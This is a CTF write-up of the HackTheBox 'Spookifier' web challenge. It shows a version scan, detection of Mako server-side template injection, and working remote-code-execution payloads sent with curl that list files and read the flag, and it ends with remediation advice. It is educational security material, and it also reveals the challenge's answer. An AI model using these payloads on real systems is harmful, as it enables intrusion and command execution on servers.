# Security Writeup: HTB Challenge - Spookifier

## 1. Executive Summary
The "Spookifier" web application was found to be vulnerable to Server-Side Template Injection (SSTI). This vulnerability allowed for Remote Code Execution (RCE) on the server, which was leveraged to read the system flag.

**Target:** `http://94.237.56.99:32727`
**Vulnerability:** Server-Side Template Injection (SSTI)
**Impact:** Remote Code Execution (RCE)
**Flag:** `HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}`

---

## 2. Reconnaissance
Using the `purpl` tool, an initial scan was performed to identify the service and its version.

### Nmap Scan
```bash
cargo run -- --nmap 94.237.56.99 --port 32727 --args="-sV"
```
**Results:**
- Port: `32727/tcp`
- Service: `http`
- Version: `Werkzeug httpd 2.0.0 (Python 3.8.15)`

This information indicated a Python-based web application, likely using a framework like Flask or Bottle.

---

## 3. Vulnerability Analysis
The application's main functionality is a "Spookifier" that reflects user-provided names in various "spooky" fonts.

### Initial Probing
A manual check of the application revealed a form that submits a `text` parameter via a GET request.
```html
<form action="/">
    <input id="input" name="text" type="text" value="" />
    <button id="go" type="submit">Spookify</button>
</form>
```

### SSTI Identification
Testing for template injection by submitting template-specific syntax:
1.  **Jinja2 Test:** Submitted `{{7*7}}`. Result: Reflected as literal `{{7*7}}`.
2.  **Mako Test:** Submitted `${7*7}`. Result: Evaluated to `49`.

This confirmed that the application uses the **Mako** template engine and is vulnerable to SSTI because it directly evaluates user input within a template context.

---

## 4. Exploitation
Mako templates allow for Python execution within `${...}` blocks.

### File System Discovery
Used the `self.module.cache.util.os.popen()` method to execute system commands.
**Payload:** `${self.module.cache.util.os.popen('ls /').read()}`

**Command:**
```bash
curl -s "http://94.237.56.99:32727/?text=%24%7Bself.module.cache.util.os.popen('ls+/').read()%7D"
```
**Output (truncated):**
- `app`
- `bin`
- `flag.txt`
- ...

### Flag Retrieval
Read the `flag.txt` file from the root directory.
**Payload:** `${self.module.cache.util.os.popen('cat /flag.txt').read()}`

**Command:**
```bash
curl -s "http://94.237.56.99:32727/?text=%24%7Bself.module.cache.util.os.popen('cat+/flag.txt').read()%7D"
```
**Flag Result:** `HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}`

---

## 5. Remediation
To mitigate this vulnerability, the application should:
1.  **Avoid Direct Evaluation:** Never pass user-controllable input directly into a template engine's evaluation context.
2.  **Sanitize Input:** If user input must be included in templates, ensure it is properly escaped and treated as literal text.
3.  **Secure Template Configuration:** Use built-in security features of the template engine to restrict access to sensitive objects and modules.